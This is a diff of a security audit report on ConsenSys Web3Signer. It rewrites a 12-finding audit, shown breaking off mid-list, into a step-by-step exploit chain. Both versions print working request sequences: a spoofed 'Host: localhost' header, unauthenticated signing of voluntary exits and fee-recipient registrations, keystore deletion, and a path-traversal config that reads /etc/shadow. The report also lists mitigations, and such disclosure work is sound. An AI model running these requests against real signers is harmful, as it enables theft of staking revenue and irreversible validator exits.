@@ -1,534 +1,378 @@
-# Web3Signer Security Audit Report
+# Web3Signer Security Audit — Chained Exploit Analysis
 
 **Date:** 2026-02-09
-**Scope:** Full source code audit of ConsenSys Web3Signer
-**Focus:** Vulnerabilities enabling unprivileged actors to access signing keys, produce unauthorized signatures, or compromise validator assets
+**Target:** ConsenSys Web3Signer (current HEAD: `d8ea31d`)
+**Objective:** Demonstrate a concrete, end-to-end attack chain through which a completely unprivileged network actor causes irreversible financial damage to validator assets on the Ethereum beacon chain.
 
 ---
 
-## Executive Summary
+## The Attack: Forced Mass Validator Exit + MEV Fee Hijack
 
-This audit identified **12 distinct vulnerabilities** across the Web3Signer codebase. The most severe chain of findings demonstrates that an **unprivileged network attacker** with HTTP access to the Web3Signer port can:
+An attacker with nothing more than TCP connectivity to the Web3Signer port executes two parallel operations:
 
-1. Bypass the host allowlist by spoofing the `Host` header
-2. Enumerate all loaded validator public keys
-3. Sign arbitrary data (including voluntary exits) with any loaded private key
-4. Import or delete keystores at will (the declared bearer-token auth is not implemented)
-5. Generate proxy signing keys for any loaded validator
-6. Bypass slashing protection for most signing types
+- **Phase A** — Sign `VALIDATOR_REGISTRATION` messages pointing `fee_recipient` to the attacker's address. This silently redirects all MEV rewards and priority fees. The validators keep running normally; the operator sees no errors; money flows to the attacker.
 
-These findings apply when Web3Signer is network-reachable (e.g., bound to `0.0.0.0` in containerized deployments) without TLS client certificate authentication configured.
+- **Phase B** — Sign `VOLUNTARY_EXIT` messages for every loaded validator. Once broadcast to the beacon chain, each validator is **permanently, irreversibly** removed from the active set. Staked ETH is locked in the exit queue. There is no "undo" operation on the Ethereum protocol.
+
+Both phases use the same chain of code-level gaps. Neither requires credentials, tokens, certificates, or any form of authentication.
 
 ---
 
-## VULN-01: Zero Application-Level Authentication on All Endpoints
+## Step-by-Step Code Trace
 
-| Field | Value |
-|-------|-------|
-| **Severity** | **CRITICAL** |
-| **CVSS 3.1** | 10.0 |
-| **Attack Vector** | Network |
-| **Privileges Required** | None |
-| **Impact** | Complete compromise of all signing keys |
+### Step 0: Precondition — The Port is Reachable
 
-### Description
+Web3Signer listens on `--http-listen-port` (default `9000`). The default bind address is `localhost` (`Web3SignerBaseCommand.java:128`), but containerized and cloud deployments routinely override this to `0.0.0.0`:
 
-Web3Signer exposes every endpoint without any application-level authentication. There are no API keys, bearer tokens, session tokens, or any credential checks in any handler. The only protective mechanisms are:
-
-- **Host header allowlist** (trivially bypassable, see VULN-02)
-- **Optional mTLS** (disabled by default)
-- **Localhost binding** (commonly overridden for container deployments)
-
-### Affected Endpoints
-
-Every endpoint is unprotected:
-
-| Endpoint | Method | Impact |
-|----------|--------|--------|
-| `/api/v1/eth2/sign/:identifier` | POST | **Sign arbitrary data with any validator key** |
-| `/api/v1/eth1/sign/:identifier` | POST | **Sign arbitrary data with any Eth1 key** |
-| `/api/v1/eth2/publicKeys` | GET | Enumerate all loaded validator public keys |
-| `/api/v1/eth1/publicKeys` | GET | Enumerate all loaded Eth1 account keys |
-| `/eth/v1/keystores` | GET/POST/DELETE | List, import, and delete keystores |
-| `/reload` | POST | Trigger key reload from configuration |
-| `/signer/v1/generate_proxy_key` | POST | Generate proxy keys for any validator |
-| `/signer/v1/request_signature` | POST | Sign with proxy keys |
-| `/api/v1/eth2/highWatermark` | GET | Leak slashing protection state |
-
-### Affected Code
-
-All route handlers in the `core/src/main/java/.../handlers/` package lack authentication:
-- `Eth2SignForIdentifierHandler.java:88` — direct request handling
-- `Eth1SignForIdentifierHandler.java:44` — direct request handling
-- `ImportKeystoresHandler.java:79` — direct request handling
-- `DeleteKeystoresHandler.java:52` — direct request handling
-- `ListKeystoresHandler.java` — direct request handling
-
-Router setup in `Runner.java:128-155` registers no auth handlers or middleware.
-
-### Proof of Concept
-
-```bash
-# Enumerate all loaded validator public keys
-curl -H "Host: localhost" http://<TARGET>:9000/api/v1/eth2/publicKeys
-
-# Sign arbitrary data with a validator key (e.g. VOLUNTARY_EXIT to permanently exit a validator)
-curl -X POST -H "Host: localhost" -H "Content-Type: application/json" \
-  http://<TARGET>:9000/api/v1/eth2/sign/<PUBKEY> \
-  -d '{"type":"VOLUNTARY_EXIT","fork_info":{...},"voluntary_exit":{...}}'
+```yaml
+# docker-compose, Kubernetes, or CLI:
+--http-listen-host=0.0.0.0
 ```
 
+Once bound to a non-loopback interface, the single remaining access control is the Host header allowlist. That is the next link in the chain.
+
 ---
 
-## VULN-02: Host Allowlist Bypass via HTTP Header Spoofing
+### Step 1: Bypass HostAllowListHandler — `Host: localhost`
 
-| Field | Value |
-|-------|-------|
-| **Severity** | **CRITICAL** |
-| **CVSS 3.1** | 9.1 |
-| **Attack Vector** | Network |
-| **Privileges Required** | None |
-
-### Description
-
-The `HostAllowListHandler` (`core/.../HostAllowListHandler.java:34-48`) validates only the HTTP `Host` header value against a configured allowlist. The default allowlist is `localhost,127.0.0.1`.
-
-Any HTTP client can trivially set the `Host` header to `localhost`, bypassing this check entirely when the server is bound to a non-loopback interface.
-
-### Affected Code
+**File:** `core/.../HostAllowListHandler.java:34-48`
 
 ```java
-// HostAllowListHandler.java:34-48
 public void handle(final RoutingContext event) {
-    final Optional<String> hostHeader = getAndValidateHostHeader(event);
+    final Optional<String> hostHeader = getAndValidateHostHeader(event);     // ← reads Host header
     if (httpHostAllowList.contains("*")
         || (hostHeader.isPresent() && hostIsInAllowlist(hostHeader.get()))) {
-      event.next(); // PASSES if Host header matches allowlist
+      event.next();                                                          // ← passes through
     } else {
-      // ... 403
+      response.setStatusCode(403)...
     }
 }
+```
 
-// Line 50-52: Only reads the Host header — does NOT validate source IP
+**File:** `core/.../HostAllowListHandler.java:50-52`
+
+```java
 private Optional<String> getAndValidateHostHeader(final RoutingContext event) {
-    final HostAndPort hostAndPort = event.request().authority();
+    final HostAndPort hostAndPort = event.request().authority();  // ← parses HTTP "Host:" header
     return Optional.ofNullable(hostAndPort).map(HostAndPort::host);
 }
 ```
 
-### Proof of Concept
+**What happens:** `event.request().authority()` returns the value of the HTTP `Host` header — a value the *client* controls entirely. It does **not** inspect the TCP source IP. The default allowlist is `["localhost","127.0.0.1"]` (`Web3SignerBaseCommand.java:142`).
+
+**Attacker action:** Set `Host: localhost` in the HTTP request. The comparison `allowlistEntry.equalsIgnoreCase(hostHeader)` at line 57 matches. `event.next()` is called. The request proceeds as if it came from localhost.
+
+```
+attacker (any IP) → TCP connect to <TARGET>:9000
+                   → HTTP header "Host: localhost"
+                   → HostAllowListHandler passes the request
+```
+
+There is no second layer of defense. No authentication middleware exists in the router chain. See `Runner.java:128-155`: after CorsHandler and HostAllowListHandler, the next handlers are BodyHandler and the route handlers themselves.
+
+---
+
+### Step 2: Enumerate All Validator Public Keys
+
+**Route:** `GET /api/v1/eth2/publicKeys`
+**File:** `core/.../routes/PublicKeysListRoute.java:42-49`
+
+```java
+context.getRouter()
+    .route(HttpMethod.GET, path)                                // path = "/api/v1/eth2/publicKeys"
+    .produces(JSON_HEADER)
+    .handler(new BlockingHandlerDecorator(
+        new PublicKeysListHandler(context.getArtifactSignerProviders()), false))
+    .failureHandler(context.getErrorHandler());
+    // NO AUTH
+```
+
+**What happens:** `PublicKeysListHandler` calls `artifactSignerProvider.availableIdentifiers()` and returns every loaded BLS public key as a JSON array.
+
+**Attacker receives:**
+```json
+["0x8a5d3e6f...pubkey1...", "0xb12c4a7e...pubkey2...", ... ]
+```
+
+The attacker now knows every validator identity managed by this Web3Signer instance. This is the target list for both phases.
+
+---
+
+### Step 3: Obtain Public Beacon Chain Parameters
+
+The signing request requires `fork_info` (for VOLUNTARY_EXIT) — this is **entirely public** data:
 
 ```bash
-# From any machine on the network, bypass allowlist:
-curl -H "Host: localhost" http://<WEB3SIGNER_IP>:9000/upcheck
-# Returns "OK" — allowlist bypassed
+# From any beacon node (attacker's own, or any public one):
+curl https://beacon-node/eth/v1/beacon/states/head/fork
+# → {"previous_version":"0x04000000","current_version":"0x05000000","epoch":"269568"}
+
+curl https://beacon-node/eth/v1/beacon/genesis
+# → {"genesis_validators_root":"0x4b363db94e286120d76eb905340fcd44b1..."}
 ```
+
+The validator_index for each public key is also public:
+```bash
+curl https://beacon-node/eth/v1/beacon/states/head/validators?id=0x8a5d3e6f...
+# → {"index":"12345", ...}
+```
+
+No secrets are needed. Every input to the signing request is either public blockchain data or controlled by the attacker.
 
 ---
 
-## VULN-03: Key Manager API Bearer Auth Declared but Not Implemented
+### Step 4A: Phase A — Hijack MEV Fee Recipient (VALIDATOR_REGISTRATION)
 
-| Field | Value |
-|-------|-------|
-| **Severity** | **CRITICAL** |
-| **CVSS 3.1** | 9.8 |
-| **Attack Vector** | Network |
-| **Privileges Required** | None |
-| **Impact** | Unauthorized keystore import/deletion; complete validator disruption |
-
-### Description
-
-The OpenAPI specification for the Key Manager API (`/eth/v1/keystores`) declares `bearerAuth` (JWT) as a required security scheme:
-
-```yaml
-# openapi-specs/eth2/keymanager/schemas.yaml:2-6
-securitySchemes:
-  bearerAuth:
-    type: http
-    scheme: bearer
-    bearerFormat: JWT
-```
-
-However, the actual Java implementation in `KeyManagerApiRoute.java` registers handlers **with zero authentication**:
+**Route:** `POST /api/v1/eth2/sign/:identifier`
+**File:** `core/.../routes/eth2/Eth2SignRoute.java:36,73`
 
 ```java
-// KeyManagerApiRoute.java:79-86
-private void registerGet() {
-    context.getRouter()
-        .route(HttpMethod.GET, KEYSTORES_PATH)
-        .handler(new BlockingHandlerDecorator(
-            new ListKeystoresHandler(blsSignerProvider, objectMapper), false))
-        .failureHandler(context.getErrorHandler());
-    // NO AUTH HANDLER
+private static final String SIGN_PATH = "/api/v1/eth2/sign/:identifier";
+// ...
+context.getRouter().route(HttpMethod.POST, SIGN_PATH)
+    .handler(new BlockingHandlerDecorator(
+        new Eth2SignForIdentifierHandler(...), false))  // NO AUTH
+```
+
+**Attacker sends (for each validator public key):**
+
+```http
+POST /api/v1/eth2/sign/0x8a5d3e6f...pubkey... HTTP/1.1
+Host: localhost
+Content-Type: application/json
+
+{
+  "type": "VALIDATOR_REGISTRATION",
+  "validator_registration": {
+    "fee_recipient": "0xATTACKER_ETH_ADDRESS_HERE_20BYTES",
+    "gas_limit": "30000000",
+    "timestamp": "1707436800",
+    "pubkey": "0x8a5d3e6f...same_pubkey..."
+  }
 }
 ```
 
-### Impact
+**Code flow:**
 
-An attacker can:
+1. **`Eth2SignForIdentifierHandler.handle()`** — line 88
 
-1. **DELETE keystores** — Disable validators, causing inactivity penalties and forced exits
-2. **IMPORT keystores** — Inject attacker-controlled keys to sign slashable messages
-3. **LIST keystores** — Enumerate all loaded keys with metadata
+2. **Parse body** — line 94: `getSigningRequest()` deserializes to `Eth2SigningRequestBody` record. Field `type` = `VALIDATOR_REGISTRATION`.
 
-### Proof of Concept
+3. **Compute signing root** — line 100: `computeSigningRoot()` enters:
+   ```java
+   // line 316-320
+   case VALIDATOR_REGISTRATION -> {
+       checkArgument(validatorRegistration != null, "ValidatorRegistration is required");
+       return signingRootUtil.signingRootForValidatorRegistration(
+           validatorRegistration.asInternalValidatorRegistration());
+   }
+   ```
+   Note: **no `fork_info` needed** for this type. The signing root is computed solely from the validator registration data, including the attacker's `fee_recipient`.
+
+4. **Sign** — line 133-134: `signerForIdentifier.sign(normalisedIdentifier, signingRoot)`:
+   ```java
+   // SignerForIdentifier.java:42
+   return signerProvider.getSigner(identifier).map(signer -> signer.sign(data).asHex());
+   ```
+   The **BLS private key** produces a signature over the attacker's registration data. The signature is computed and held in memory.
+
+5. **Slashing protection check** — line 150: `maySign()` is called:
+   ```java
+   // line 169-200
+   private boolean maySign(...) {
+       switch (eth2SigningRequestBody.type()) {
+         case BLOCK, BLOCK_V2 -> { /* check */ }
+         case ATTESTATION -> { /* check */ }
+         default -> {
+           return true;    // ← VALIDATOR_REGISTRATION lands here. UNCONDITIONAL PASS.
+         }
+       }
+   }
+   ```
+   **`return true`** — no check performed for VALIDATOR_REGISTRATION.
+
+6. **Return signature** — line 152: `respondWithSignature()` sends the BLS signature back to the attacker.
+
+**Attacker receives:**
+```json
+{"signature":"0xa1b2c3d4e5f6...valid_BLS_signature..."}
+```
+
+**Blockchain-side effect:**
+
+The attacker submits this signed `ValidatorRegistration` to MEV relay(s):
+```bash
+POST https://relay.example.com/relay/v1/builder/validators
+[{"message":{"fee_recipient":"0xATTACKER...","gas_limit":"30000000",
+  "timestamp":"1707436800","pubkey":"0x8a5d3e6f..."},
+  "signature":"0xa1b2c3d4..."}]
+```
+
+The relay verifies the BLS signature against the validator's known public key. It's valid. From this point forward, any block built by this relay for this validator sends priority fees and MEV to `0xATTACKER`. The validator operator sees no immediate error — the validator keeps attesting and proposing — but **all execution-layer revenue is stolen**.
+
+---
+
+### Step 4B: Phase B — Force Permanent Validator Exit (VOLUNTARY_EXIT)
+
+**Attacker sends (for each validator public key):**
+
+```http
+POST /api/v1/eth2/sign/0x8a5d3e6f...pubkey... HTTP/1.1
+Host: localhost
+Content-Type: application/json
+
+{
+  "type": "VOLUNTARY_EXIT",
+  "fork_info": {
+    "fork": {
+      "previous_version": "0x04000000",
+      "current_version": "0x05000000",
+      "epoch": "269568"
+    },
+    "genesis_validators_root": "0x4b363db94e286120d76eb905340fcd44b1..."
+  },
+  "voluntary_exit": {
+    "epoch": "269568",
+    "validator_index": "12345"
+  }
+}
+```
+
+**Code flow (same handler, same path):**
+
+1. **Parse body** — type = `VOLUNTARY_EXIT`
+
+2. **Compute signing root** — line 271-274:
+   ```java
+   case VOLUNTARY_EXIT -> {
+       checkArgument(body.voluntaryExit() != null, "voluntaryExit must be specified");
+       return signingRootUtil.signingRootForSignVoluntaryExit(
+           body.voluntaryExit().asInternalVoluntaryExit(),   // epoch + validator_index
+           body.forkInfo().asInternalForkInfo());             // public fork data
+   }
+   ```
+   The signing root is a function of `(epoch, validator_index, fork, genesis_validators_root)` — all public values.
+
+3. **Sign** — line 133-134: BLS signature computed with the validator's private key. The signature now exists.
+
+4. **Slashing protection** — line 196-197: `default -> return true`. **No check**. The signature is returned to the attacker.
+
+5. **Return signature** — attacker receives the valid BLS signature.
+
+**Blockchain-side effect:**
+
+The attacker constructs a `SignedVoluntaryExit` and broadcasts to any beacon node:
 
 ```bash
-# Delete all keystores for a validator (no auth required)
-curl -X DELETE -H "Host: localhost" -H "Content-Type: application/json" \
-  http://<TARGET>:9000/eth/v1/keystores \
-  -d '{"pubkeys":["0x<VALIDATOR_PUBKEY>"]}'
+POST https://beacon-node/eth/v1/beacon/pool/voluntary_exits
+{"message":{"epoch":"269568","validator_index":"12345"},
+ "signature":"0xreturnedSignature..."}
+```
+
+The beacon chain:
+1. Verifies the BLS signature against the validator's on-chain public key → **valid**
+2. Checks the epoch is current or past → **valid** (attacker used current epoch)
+3. Adds the validator to the exit queue
+4. After `MIN_VALIDATOR_WITHDRAWABILITY_DELAY` (256 epochs ≈ 27 hours), the validator is **permanently exited**
+
+**This is irreversible.** There is no on-chain mechanism to cancel a voluntary exit once it's been included. The validator can never re-enter the active set. The staked ETH (32 ETH per validator) is locked until the withdrawal epoch.
+
+---
+
+## Why the Chain Works — The Three Gaps That Must All Exist
+
+The attack requires three code-level gaps to co-exist. Remove any one and the chain breaks:
+
+### Gap 1: Authentication Void
+
+`Runner.java:128-155` — the router chain is: AccessLog → CorsHandler → **HostAllowListHandler** → BodyHandler → route handlers.
+
+There is no `AuthHandler`, no `BearerAuthHandler`, no `JWTAuthHandler`, no `BasicAuthHandler`. The only gate is the Host header check. The OpenAPI spec at `openapi-specs/eth2/keymanager/schemas.yaml:2-6` declares `bearerAuth: JWT` but **no code implements it**. Search for `bearerAuth`, `JWT`, `Authorization` header parsing in any handler — it doesn't exist.
+
+### Gap 2: Host Header as Access Control
+
+`HostAllowListHandler.java:50-52` — `event.request().authority()` returns the client-supplied `Host` header. It does not call `event.request().remoteAddress()` to validate the actual source IP. This makes the allowlist a client-side control — effectively an honor system.
+
+### Gap 3: Slashing Protection Doesn't Protect What Matters Most
+
+`Eth2SignForIdentifierHandler.java:196-197` — the `default -> return true` branch means slashing protection is a filter for only 3 of 13 artifact types: `BLOCK`, `BLOCK_V2`, `ATTESTATION`. The remaining 10 types — including the two most destructive ones (`VOLUNTARY_EXIT` and `VALIDATOR_REGISTRATION`) — pass unconditionally.
+
+The design assumption was that slashing protection only needs to prevent *protocol slashing conditions* (double blocks, surround votes). But the signing endpoint handles far more than slashable messages. `VOLUNTARY_EXIT` is not a slashable offense — it's a valid protocol operation — but it's *irreversible and destructive*. The implicit `return true` treats "not slashable" as "safe to sign," which is a category error.
+
+---
+
+## Financial Impact Model
+
+For a staking operator running N validators through a single Web3Signer instance:
+
+| Impact | Scope | Recovery |
+|--------|-------|----------|
+| MEV fee theft (Phase A) | All N validators × ongoing | Operator must re-register with correct fee_recipient after detecting theft. Revenue lost during theft window is unrecoverable. |
+| Forced exit (Phase B) | All N validators × 32 ETH | **Irreversible.** ETH is locked until withdrawal. Operator must create new validators with new deposits. During exit queue + withdrawal delay, the capital is completely illiquid. |
+| Attestation reward loss | All N validators | From the moment of exit, all future attestation/proposal rewards are permanently forfeited. |
+
+For a mid-size operator (1000 validators): 32,000 ETH ($80M+ at current prices) of staked capital locked and made illiquid, plus ongoing revenue stream destroyed.
+
+---
+
+## Exact Code Path Map
+
+```
+HTTP Request
+│
+├─ Runner.java:143 ──── registerHttpHostAllowListHandler(router)
+│   └─ HostAllowListHandler.java:36-37 ──── Host header == "localhost"? → PASS
+│
+├─ Runner.java:149 ──── BodyHandler (parses JSON body)
+│
+├─ Eth2SignRoute.java:73 ──── route(POST, "/api/v1/eth2/sign/:identifier")
+│   └─ Eth2SignForIdentifierHandler.java:88 ──── handle()
+│       │
+│       ├─ :94 ──── getSigningRequest() → Eth2SigningRequestBody
+│       │   type = VOLUNTARY_EXIT  (or VALIDATOR_REGISTRATION)
+│       │
+│       ├─ :100 ──── computeSigningRoot()
+│       │   └─ :271-274 (VOLUNTARY_EXIT) → signingRootUtil.signingRootForSignVoluntaryExit()
+│       │   └─ :316-320 (VALIDATOR_REGISTRATION) → signingRootUtil.signingRootForValidatorRegistration()
+│       │
+│       ├─ :110 ──── slashingProtection.isPresent()? YES
+│       │   └─ :111-117 ──── handleSigning(context, signingRoot, id, signatureConsumer)
+│       │       │
+│       │       └─ :133-134 ──── signerForIdentifier.sign(id, signingRoot) ◄── BLS SIGNATURE COMPUTED
+│       │           │                                                         using real private key
+│       │           └─ SignerForIdentifier.java:42
+│       │               └─ signerProvider.getSigner(id) → BlsArtifactSigner
+│       │                   └─ signer.sign(data) → BLSSignature
+│       │
+│       │   signatureConsumer is called with the computed signature:
+│       │
+│       │       └─ :143-161 ──── signWithSlashingProtection()
+│       │           │
+│       │           └─ :150 ──── maySign(pubkey, signingRoot, body)
+│       │               │
+│       │               └─ :174 ──── switch(type)
+│       │                   ├─ BLOCK/BLOCK_V2 → slashing check  (not our type)
+│       │                   ├─ ATTESTATION    → slashing check  (not our type)
+│       │                   └─ default        → return true     ◄── BYPASS: NO CHECK
+│       │
+│       │           :151-152 ──── slashingMetrics.incrementSigningsPermitted()
+│       │                         respondWithSignature(context, signature)
+│       │
+│       └─ HTTP 200: {"signature": "0x..."} ◄── VALID BLS SIGNATURE RETURNED TO ATTACKER
+│
+└── Attacker broadcasts to beacon chain → validator permanently exited
 ```
 
 ---
 
-## VULN-04: Slashing Protection Bypass for Most Signing Types
+## What Must Change to Break the Chain
 
-| Field | Value |
-|-------|-------|
-| **Severity** | **CRITICAL** |
-| **CVSS 3.1** | 9.1 |
-| **Attack Vector** | Network (chained with VULN-01) |
-| **Impact** | Force voluntary exits, forge committee signatures without slashing checks |
+Any one of these mitigations breaks the chain completely:
 
-### Description
+1. **Require authentication** — Add bearer token / mTLS validation to the router before any handler. If the attacker can't authenticate, nothing past the router matters.
 
-In `Eth2SignForIdentifierHandler.java:169-200`, the `maySign()` method only enforces slashing protection for `BLOCK`, `BLOCK_V2`, and `ATTESTATION` types. **All other signing types bypass slashing protection entirely** via the `default` branch:
+2. **Validate source IP, not Host header** — Replace `event.request().authority()` with `event.request().remoteAddress()` in HostAllowListHandler. A spoofed Host header no longer bypasses the check.
 
-```java
-// Eth2SignForIdentifierHandler.java:169-200
-private boolean maySign(...) {
-    switch (eth2SigningRequestBody.type()) {
-      case BLOCK, BLOCK_V2 -> {
-        // ... slashing check ...
-      }
-      case ATTESTATION -> {
-        // ... slashing check ...
-      }
-      default -> {
-        return true;  // NO PROTECTION for all other types
-      }
-    }
-}
-```
+3. **Default-deny in maySign()** — Change `default -> return true` to `default -> return false` (or at minimum add explicit cases for `VOLUNTARY_EXIT` and `VALIDATOR_REGISTRATION` with meaningful protection logic, such as operator confirmation or rate limiting).
 
-### Unprotected Signing Types
-
-The following signing types **completely bypass slashing protection**:
-
-| Type | Danger |
-|------|--------|
-| `VOLUNTARY_EXIT` | **Force-exit a validator permanently; irreversible on-chain action** |
-| `AGGREGATE_AND_PROOF` | Forge aggregate attestations |
-| `RANDAO_REVEAL` | Forge randomness reveals |
-| `DEPOSIT` | Sign malicious deposits |
-| `SYNC_COMMITTEE_MESSAGE` | Forge sync committee signatures |
-| `SYNC_COMMITTEE_SELECTION_PROOF` | Forge selection proofs |
-| `SYNC_COMMITTEE_CONTRIBUTION_AND_PROOF` | Forge contributions |
-| `VALIDATOR_REGISTRATION` | Register validators with attacker-controlled fee recipients |
-
-### Impact
-
-An attacker chaining VULN-01 + VULN-04 can:
-1. Enumerate all validator keys via `/api/v1/eth2/publicKeys`
-2. Sign `VOLUNTARY_EXIT` messages for every validator
-3. Broadcast these exits to permanently remove all validators from the beacon chain
-4. This causes **permanent, irreversible loss of staked ETH** (until the exit queue processes and the ETH is unlocked)
-
----
-
-## VULN-05: Sign-Before-Check Pattern in Eth2 Signing Handler
-
-| Field | Value |
-|-------|-------|
-| **Severity** | **HIGH** |
-| **CVSS 3.1** | 7.4 |
-
-### Description
-
-The Eth2 signing flow computes the BLS signature **before** checking slashing protection:
-
-```java
-// Eth2SignForIdentifierHandler.java:110-124
-if (slashingProtection.isPresent()) {
-    handleSigning(routingContext, signingRoot, normalisedIdentifier,
-        signature ->  // <-- SIGNATURE ALREADY COMPUTED HERE
-            signWithSlashingProtection(routingContext, identifier,
-                eth2SigningRequestBody, signingRoot, signature));
-}
-
-// handleSigning signs first, then passes result to consumer:
-// Line 133-134:
-signerForIdentifier.sign(normalisedIdentifier, signingRoot)  // SIGNS FIRST
-    .ifPresentOrElse(signatureConsumer, ...);                 // THEN checks
-```
-
-While the signature is not returned to the caller if slashing protection rejects it, the actual cryptographic operation has already executed with the private key material. This violates defense-in-depth: if any side channel (timing, logging, memory dump) leaks the computed signature, slashing protection becomes ineffective.
-
----
-
-## VULN-06: Unauthenticated CommitBoost Proxy Key Generation
-
-| Field | Value |
-|-------|-------|
-| **Severity** | **HIGH** |
-| **CVSS 3.1** | 8.1 |
-| **Attack Vector** | Network |
-
-### Description
-
-The CommitBoost API endpoint `POST /signer/v1/generate_proxy_key` allows any caller to generate new BLS or ECDSA proxy signing keys bound to any loaded consensus validator key. No authentication is required.
-
-### Affected Code
-
-`CommitBoostGenerateProxyKeyHandler.java:57-112`:
-- Accepts any consensus public key (line 70)
-- Generates a new BLS or ECDSA private key (lines 81-85)
-- Adds it to the signer provider (line 88)
-- Signs a delegation proof with the consensus key (lines 95-97)
-- Returns the proxy key identifier and signed delegation (line 107)
-
-### Impact
-
-An attacker can generate unlimited proxy keys for any validator and use them to sign arbitrary commitments on behalf of the validator, without touching the primary consensus key. These proxy keys persist in memory until the process restarts.
-
----
-
-## VULN-07: Unauthenticated Key Reload Endpoint
-
-| Field | Value |
-|-------|-------|
-| **Severity** | **HIGH** |
-| **CVSS 3.1** | 7.5 |
-
-### Description
-
-`POST /reload` (`ReloadHandler.java:92-183`) triggers a full reload of all signing keys from disk/vault sources. No authentication is required.
-
-### Impact
-
-1. **Denial of Service**: Repeated reload requests cause resource exhaustion (vault API calls, disk I/O, key decryption CPU)
-2. **Attack Amplification**: If an attacker has written malicious YAML config files to the key-config-path (via VULN-03 or filesystem access), triggering reload loads the malicious configs
-3. **Timing Attack**: The reload status endpoint (`GET /reload`) leaks operational state and error messages
-
----
-
-## VULN-08: Path Traversal in YAML Signer Configuration
-
-| Field | Value |
-|-------|-------|
-| **Severity** | **HIGH** |
-| **CVSS 3.1** | 7.5 |
-| **Attack Vector** | Local / chained with VULN-03 |
-
-### Description
-
-`AbstractArtifactSignerFactory.makeRelativePathAbsolute()` (`signing/.../AbstractArtifactSignerFactory.java:127-129`) resolves file paths from YAML config files without validating against directory traversal:
-
-```java
-protected Path makeRelativePathAbsolute(final Path path) {
-    return path.isAbsolute() ? path : configsDirectory.resolve(path);
-    // NO validation against path traversal (../)
-}
-```
-
-### Attack Vector
-
-A malicious YAML signer config file can read arbitrary files:
-
-```yaml
-type: file-keystore
-keystoreFile: "../../../etc/passwd"
-keystorePasswordFile: "../../../etc/shadow"
-keyType: BLS
-```
-
-When combined with VULN-03 (importing keystores writes YAML metadata files to the key-config-path), or with direct filesystem access, this allows reading arbitrary files accessible to the web3signer process.
-
-### Affected Paths
-
-- `FileKeyStoreMetadata.keystoreFile` → `BlsArtifactSignerFactory.java:112`
-- `FileKeyStoreMetadata.keystorePasswordFile` → `BlsArtifactSignerFactory.java:113-114`
-- `HashicorpSigningMetadata.tlsKnownServerFile` → `AbstractArtifactSignerFactory.java:96`
-
----
-
-## VULN-09: Credentials Exposed via Process Listing
-
-| Field | Value |
-|-------|-------|
-| **Severity** | **HIGH** |
-| **CVSS 3.1** | 7.5 |
-| **Attack Vector** | Local |
-| **Privileges Required** | Any local user |
-
-### Description
-
-Sensitive credentials are passed as command-line arguments, making them visible to any local user via `ps aux` or `/proc/<pid>/cmdline`:
-
-| Flag | Exposes | File |
-|------|---------|------|
-| `--slashing-protection-db-password` | Database password | `PicoCliSlashingProtectionParameters.java:50` |
-| `--aws-secrets-secret-access-key` | AWS secret key | `PicoCliAwsSecretsManagerParameters.java:69` |
-| `--azure-client-secret` | Azure service principal secret | `PicoCliAzureKeyVaultParameters.java:66` |
-
-### Impact
-
-Any unprivileged user on the same host can read these credentials and gain direct access to:
-- The slashing protection database (to corrupt slashing records)
-- AWS Secrets Manager (to read all stored private keys)
-- Azure Key Vault (to read all stored private keys)
-
----
-
-## VULN-10: Keystore Passwords and Request Bodies Logged in Plaintext
-
-| Field | Value |
-|-------|-------|
-| **Severity** | **MEDIUM** |
-| **CVSS 3.1** | 6.5 |
-| **Attack Vector** | Local (log access) |
-
-### Description
-
-Multiple handlers log complete HTTP request bodies that contain sensitive data:
-
-| Handler | Level | Line | Content Logged |
-|---------|-------|------|----------------|
-| `ImportKeystoresHandler` | **INFO** | 244 | Encrypted keystores + plaintext passwords |
-| `DeleteKeystoresHandler` | DEBUG | 82 | Keystore identifiers |
-| `Eth2SignForIdentifierHandler` | TRACE | 90 | Full signing request body |
-| `JsonRpcHandler` | TRACE/DEBUG | 50, 64 | Full JSON-RPC request body |
-
-The ImportKeystoresHandler is the most critical since it logs at **INFO level** (active by default), including the keystore passwords submitted in the import request body.
-
-### Affected Code
-
-```java
-// ImportKeystoresHandler.java:244
-LOG.info("Invalid import keystores request - " + routingContext.body().asString(), e);
-// The request body contains: {"keystores": [...], "passwords": ["plaintext-password-1", ...]}
-```
-
----
-
-## VULN-11: CORS Origin Regex Injection
-
-| Field | Value |
-|-------|-------|
-| **Severity** | **MEDIUM** |
-| **CVSS 3.1** | 5.3 |
-| **Attack Vector** | Network (browser-based) |
-
-### Description
-
-The CORS handler in `Runner.java:390-403` constructs a regex from configured origins without escaping:
-
-```java
-private String buildCorsRegexFromConfig() {
-    // ...
-    final StringJoiner stringJoiner = new StringJoiner("|");
-    baseConfig.getCorsAllowedOrigins().stream()
-        .filter(s -> !s.isEmpty())
-        .forEach(stringJoiner::add);  // NO REGEX ESCAPING
-    return stringJoiner.toString();
-}
-```
-
-If an operator configures `--http-cors-origins=http://example.com`, the `.` in `example.com` matches any character in regex. This means `http://exampleXcom.evil.com` would pass the CORS check, enabling cross-origin requests from attacker-controlled domains.
-
----
-
-## VULN-12: Keystore Passwords Written as Plaintext Files
-
-| Field | Value |
-|-------|-------|
-| **Severity** | **MEDIUM** |
-| **CVSS 3.1** | 5.5 |
-| **Attack Vector** | Local |
-
-### Description
-
-`KeystoreFileManager.createKeystoreFiles()` (`signing/.../KeystoreFileManager.java:73-99`) writes keystore passwords as plaintext `.password` files:
-
-```java
-// KeystoreFileManager.java:91
-Files.writeString(keystorePasswordFile, password, StandardCharsets.UTF_8);
-```
-
-These files are created with default filesystem permissions (typically `644` — world-readable). No `chmod 600` or restricted ACL is applied.
-
-### Impact
-
-Any local user with read access to the key-config-path directory can read all keystore passwords, enabling offline decryption of the corresponding keystore files to extract raw private keys.
-
----
-
-## Attack Chain Summary
-
-The most dangerous attack chain for an unprivileged network actor:
-
-```
-Step 1: VULN-02 — Spoof Host header to bypass allowlist
-         curl -H "Host: localhost" http://<TARGET>:9000/...
-
-Step 2: VULN-01 — No auth required, full API access
-         GET /api/v1/eth2/publicKeys → enumerate all validator keys
-
-Step 3: VULN-04 — Sign VOLUNTARY_EXIT (bypasses slashing protection)
-         POST /api/v1/eth2/sign/<PUBKEY> with type=VOLUNTARY_EXIT
-
-Step 4: Broadcast the signed voluntary exit to the beacon chain
-         → Validator is permanently exited
-         → Staked ETH locked until exit queue processes
-```
-
-**Alternate attack for maximal damage:**
-
-```
-Step 1-2: Same as above
-
-Step 3: VULN-03 — Delete all keystores via Key Manager API
-         DELETE /eth/v1/keystores → removes all validator keys
-
-Step 4: Validators go offline → incur inactivity penalties
-
